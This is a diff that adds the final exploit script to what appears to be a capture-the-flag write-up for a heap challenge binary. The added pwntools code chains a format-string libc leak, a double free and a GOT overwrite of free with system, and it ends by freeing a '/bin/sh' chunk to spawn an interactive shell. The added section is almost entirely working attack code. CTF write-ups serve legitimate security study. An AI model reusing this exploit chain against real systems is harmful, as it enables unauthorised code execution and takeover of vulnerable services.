@@ -29,3 +29,47 @@ Our strategy is pretty simple:
 9. allocate chunk with content "/bin/sh\x00"
 10. allocate chunk with content p32(system)
 11. free chunk with /bin/sh
+
+The final exploit:
+```python
+from pwn import *
+cmd = lambda x : p.sendlineafter('4) quit\n>', str(x))
+answer = lambda x : p.sendlineafter(': ', str(x))
+def allocate_chunk(id, size, content):
+	cmd(1)
+	answer(id)
+	answer(size)
+	answer(content)
+	p.send('\n')
+
+def delete_chunk(id):
+	cmd(3)
+	answer(id)
+def list_chunks():
+	cmd(2)
+	return p.recvuntil('\n\n').split('\n')[:-2]
+freegot = 0x804b43c
+p = process('./df', env={'MALLOC_CHECK_':'0', 'LD_PRELOAD' : "/opt/glibc2.27x86/lib/libc.so.6 /opt/glibc2.27x86/lib/libpthread.so.0 /opt/glibc2.27x86/lib/ld-linux.so.2"})
+#p = process('./df')
+#p = remote('tasks.open.kksctf.ru', 10000)
+libc = ELF('/opt/glibc2.27x86/lib/libc.so.6')
+gdb.attach(p)
+allocate_chunk(0, 128, '%13$p')
+libc_base = int(list_chunks()[0][2:],16)-0x1dba5
+system = libc_base+libc.symbols['system']
+print 'LIBC leak:', hex(libc_base)
+print 'system:', hex(system)
+delete_chunk(0)
+allocate_chunk(0, 128, 'a'*8)
+allocate_chunk(1, 128, '%7c%6$hhn')
+delete_chunk(0)
+list_chunks()
+delete_chunk(0)
+list_chunks()
+delete_chunk(0)
+allocate_chunk(3, 128, p32(freegot))
+allocate_chunk(5, 128, '/bin/sh\x00')
+allocate_chunk(0, 128, p32(system))
+delete_chunk(5)
+p.interactive()```
+
